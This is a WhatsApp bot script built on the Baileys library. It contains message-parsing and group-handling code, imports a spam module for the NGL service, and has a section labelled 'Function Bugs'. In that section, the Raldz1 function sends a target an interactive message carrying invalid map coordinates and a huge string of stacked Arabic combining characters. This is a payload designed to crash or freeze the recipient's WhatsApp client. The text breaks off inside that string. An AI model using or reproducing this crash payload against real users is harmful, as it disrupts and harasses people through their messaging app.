  /**
  
Base Created By KyuuRzy
Script Created By RaldzzXyz
  
  **/
  
require('../setting/config');

const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const crypto = require('crypto');
const fetch = require("node-fetch")
const jimp = require("jimp")
const os = require('os')
const path = require('path')
const cp = require('child_process');
const { promisify } = require('util');
const util = require("util");
const ms = require("parse-ms");
const sharp = require('sharp');
const yts = require('yt-search')
const moment = require("moment-timezone");
const { spawn, exec, execSync } = require('child_process');
const { color } = require('./lib/color');

const {
    default: baileys,
    proto,
    delay,
    jidNormalizedUser,
    generateWAMessage,
    generateWAMessageFromContent,
    getContentType,
    prepareWAMessageMedia,
} = require("@whiskeysockets/baileys");

module.exports = conn = async (conn, m, chatUpdate, mek, store) => {
   try {
         if (global.db.data == null) await loadDatabase();
         require('./lib/database/schema')(m)

const chats = global.db.data.chats[m.chat];
const users = global.db.data.users[m.sender];
const settings = global.db.data.settings;
      
const body = (
    m.mtype === "conversation" ? m.message.conversation :
    m.mtype === "imageMessage" ? m.message.imageMessage.caption :
    m.mtype === "videoMessage" ? m.message.videoMessage.caption :
    m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
    m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
    m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
    m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
    m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
    m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
    m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || 
    m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const budy = (typeof m.text === 'string' ? m.text : '');
var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? 
                        body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" 
                      : global.prefa ?? global.prefix
        
var textmessage = (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || budy) : ""

const content = JSON.stringify(mek.message)
const type = Object.keys(mek.message)[0];
if (m && type == "protocolMessage") conn.ev.emit("message.delete", m.message.protocolMessage.key);
const { sender } = m;
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

//database 
const kontributor = JSON.parse(fs.readFileSync('./start/lib/database/owner.json'));
const _afk = JSON.parse(fs.readFileSync('./start/lib/database/afk.json'));
const pendaftar = JSON.parse(fs.readFileSync('./start/lib/database/pendaftar.json'));
const orang_spam = JSON.parse(fs.readFileSync('./start/lib/database/spaming.json'));
const user_ban = JSON.parse(fs.readFileSync('./start/lib/database/banned.json'))

const botNumber = await conn.decodeJid(conn.user.id);
const isUser = pendaftar.includes(m.sender)
const Access = [botNumber, ...global.owner, ...kontributor]
  .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
  .includes(m.sender) ? true : m.isChecking ? true :false

//------ Prefix Function
    const CMD = body.startsWith(prefix)
    const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
//------ End

const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");

const fatkuns = m.quoted || m;
const quoted = 
  fatkuns.mtype === 'buttonsMessage' ? fatkuns[Object.keys(fatkuns)[1]] :
  fatkuns.mtype === 'templateMessage' ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
  fatkuns.mtype === 'product' ? fatkuns[Object.keys(fatkuns)[0]] :
  m.quoted ? m.quoted :
  m;

const qmsg = quoted.msg || quoted;
const mime = qmsg.mimetype || '';
const isImage = type === 'imageMessage';
const isVideo = type === 'videoMessage';
const isAudio = type === 'audioMessage';
const isMedia = /image|video|sticker|audio/.test(mime);

const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
const isQuotedText = type === 'extendedTextMessage' && content.includes('conversation')
const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2')

//group
const groupMetadata = isGroup ? await conn.groupMetadata(m.chat).catch(() => {}) : "";
const groupOwner = isGroup && groupMetadata ? groupMetadata.owner : "";
const groupName = isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? participants.filter(v => v.admin !== null).map(v => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;

const TypeMess = getContentType(m?.message);
let reactions = TypeMess == "reactionMessage" ? m?.message[TypeMess]?.text : false;
        
const isBan = user_ban.includes(m.sender)
//time
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐚𝐥𝐚𝐦"
} else if (time >= "15:00:00" && time < "19:00:00") {
    ucapanWaktu = "🌄𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐨𝐫𝐞"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐢𝐚𝐧𝐠"
} else if (time >= "06:00:00" && time < "11:00:00") {
    ucapanWaktu = "🏙️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐏𝐚𝐠𝐢"
} else {
    ucapanWaktu = "🌆𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐮𝐛𝐮𝐡"
};

const peler = fs.readFileSync('./start/lib/media/peler.jpg')
const cina = ["https://files.catbox.moe/z9rxf9.jpg"]
 
function getRandomImage() {
    const randomIndex = Math.floor(Math.random() * cina.length);
    return cina[randomIndex];
}
const cinahitam = getRandomImage()

async function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)]
}
        
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)

//function
const {
    smsg,
    sendGmail,
    formatSize,
    isUrl,
    generateMessageTag, 
    getBuffer,
    getSizeMedia, 
    runtime, 
    fetchJson, 
    sleep,
    getRandom
} = require('./lib/myfunction');
    
const { 
    imageToWebp, 
    videoToWebp,
    writeExifImg,
    writeExifVid,
    addExif
} = require('./lib/exif')

const {
	jadibot,
	stopjadibot,
	listjadibot
} = require('./jadibot')

const { ytdl } = require('./lib/scrape/scrape-ytdl');   
const { spamngl } = require('./lib/scrape/scrape-ngl');
const { pindl } = require('./lib/scrape/scrape-pindl')
const { tiktok } = require('./lib/scrape/scrape-tiktok')
const { igdl } = require('./lib/scrape/scrape-igdl')
const { luminai } = require('./lib/scrape/scrape-luminai')
const { VocalRemover } = require('./lib/scrape/scrape-tovocal')
const { Telesticker } = require('./lib/scrape/scrape-telesticker')
const { pinterest } = require("./lib/scrape/scrape-pinterest");
const { scrapeSoundCloud } = require("./lib/scrape/scrape-soundcloud")
const msgFilter = require("./lib/antispam");
const uploadImage = require('./lib/uploadImage');
        
const afk = require("./lib/afk")
const isAfkOn = afk.checkAfkUser(m.sender, _afk)
/* fungsinya, ketika user yang sudah menggunakan command afk, maka tidak bisa lagi menggunakan command tersebut sampai dia kembali dari afk nya */

const _prem = require("./lib/premium");
const isPremium = Access ? true : _prem.checkPremiumUser(m.sender);
//const gcounti = global.gcount
//const gcount = isPremium ? gcounti.prem : gcounti.user
let limitUser = isPremium ? 1500 : global.limitCount

if (reactions) {
    if (["😂"].includes(reactions)) {
        let crt = fs.readFileSync('./start/lib/media/ngakak.mp3')
        conn.sendPresenceUpdate('recording', m.chat)
        conn.sendMessage(m.chat, { 
            audio: crt, 
            mimetype:'audio/mpeg',
            ptt:true
        }, {quoted: m})
    }
}
        
if (reactions) {
    if (["😳"].includes(reactions)) {
        let crt = fs.readFileSync('./start/lib/media/duit.mp3')
        conn.sendPresenceUpdate('recording', m.chat)
        conn.sendMessage(m.chat, { 
            audio: crt, 
            mimetype:'audio/mpeg',
            ptt:true
        }, {quoted: m})
    }
}
        
const reaction = async (jidss, emoji) => {
    conn.sendMessage(jidss, {
        react: { text: emoji,
                key: m.key 
               } 
            }
        );
    };
// ================ Function Bugs =================== \\
async function Raldz1(target, Ptcp = true) {
  try {
    await conn.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: -999.03499999999999,
                  degreesLongitude: 999.03499999999999,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "[🌹] 𝗥̷̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗔̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗟̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗗̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡ 𝗭̷̷̷̸̷̷̷̋͜͢͜͢͠͡͡\n" + "꙳ۖۗۡۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫